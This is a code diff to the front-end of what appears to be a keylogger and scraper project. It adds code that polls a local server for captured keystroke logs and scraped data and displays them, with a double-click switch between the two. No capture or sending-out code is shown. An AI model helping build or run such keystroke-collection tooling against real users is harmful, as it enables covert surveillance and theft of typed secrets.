@@ -1,3 +1,4 @@
+
 const baseUrl = "http://localhost:3000";
 const logList = document.querySelector("#log-list");
 let tag = false;
@@ -42,7 +43,6 @@ const getKeyLogs = async () => {
       url: `${baseUrl}/keylogs`,
       data: {},
     });
-    console.log(data);
     deleteElements(logList, "li");
     data.forEach((log) => {
       const listItem = createListItem("log", createLogElement("log-span", log));
@@ -53,5 +53,27 @@ const getKeyLogs = async () => {
   }
 };
 
-setInterval(getKeyLogs, 2000);
+const getScrapes = async () => {
+  try {
+    let {data } = await axios({
+      method: "GET",
+      url: `${baseUrl}/scrapes`,
+      data: {},
+    })
+    deleteElements(logList, "li");
+    data.forEach((scrape) => {
+      const listItem = createListItem("scrape", createLogElement("log-span", scrape));
+      logList.appendChild(listItem);
+    });
+  }
+  catch ({message}) {
+    console.log(message)
+  }
+}
 
+const keyloggerInterval = setInterval(getKeyLogs, 2000);
+
+window.addEventListener("dblclick", () => {
+  clearInterval(keyloggerInterval);
+  setTimeout(getScrapes(),1200);
+})
